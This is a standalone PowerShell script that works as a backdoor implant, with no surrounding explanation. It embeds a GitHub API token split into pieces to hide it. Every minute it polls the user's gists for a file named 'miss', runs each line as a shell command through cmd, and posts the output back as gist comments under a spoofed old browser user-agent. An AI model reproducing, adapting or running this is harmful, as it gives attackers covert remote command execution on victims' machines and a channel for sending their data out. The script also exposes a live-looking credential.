$gistsUser="mikemcle"; $t1="6a34f0822547621838382"; $checkTime=05; $t2="cf1c6ea8e59"; $t3="2356df8d";$gistsApiToken=$t1+$t2+$t3; function sendResult($r){ try{ $encodeResult=[System.Web.HttpUtility]::UrlEncode([system.String]::Join("`r`n",$r)); $webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)"); $r=$webclient.UploadString($cmdGist.comments_url,"{""body"":""$encodeResult""}"); }catch{ $encodeResult=[System.Web.HttpUtility]::UrlEncode([system.String]::Join("`r`n",$_));$webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)"); 	$r=$webclient.UploadString($cmdGist.comments_url,"{""body"":""$encodeResult""}"); } } function parseCommand($command){ $jsonCommandStr="{"+$command+"}"; try{ 	 [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions"); 	$ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer; 	$jsonCommand = $ser.DeserializeObject($jsonCommandStr); }catch{ 	sendResult("ERROR: $_"); } if($jsonCommand -and $jsonCommand.Command.length -gt 0){ 	 $commandStr=$jsonCommand.Command; 	 if($commandStr){ 	 $result = cmd /c ($commandStr+" 2>&1"); 	 sendResult("Command Result for $commandStr :`r`n"+$result); 	 } } } $oldCommand=""; $webclient=new-object System.Net.WebClient; $upass=[System.Text.Encoding]::UTF8.GetBytes("${gistsUser}:${gistsApiToken}"); $authHeader="Basic "+[System.Convert]::ToBase64String($upass); $webclient.Headers.Add("Authorization",$authHeader); $headerx="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";$webclient.Headers.Add("user-agent",$headerx);
while(1){ Start-Sleep -Seconds 60; $webclient.Headers.Add("user-agent", $headerx); $gists=$webclient.DownloadString('https://api.github.com/gists');[System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions"); $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer; $jsonGists = $ser.DeserializeObject($gists); $cmdId=""; $cmdGist={}; foreach ($oneGist in $jsonGists){ 	 if(($oneGist["files"].miss ) -and ($oneGist["files"].miss.filename -eq "miss")){ 	 $cmdId=$oneGist.id; 	 $cmdGist=$oneGist; 	 break; 	 } } $command=""; if(($cmdId.length -gt	0) -and	($cmdGist.url.length -gt 0)){ $webclient.Headers.Add("user-agent",$headerx); $cmdGistContent=$webclient.DownloadString($cmdGist.url); [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions"); $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer; $cmdGistDetail = $ser.DeserializeObject($cmdGistContent); $command=$cmdGistDetail["files"].miss.content; } if($command -and ($command -ne $oldCommand)){ $commandList=$command.split("`n"); foreach ($oneCommand in $commandList){ parseCommand($oneCommand); } $oldCommand=$command; } }
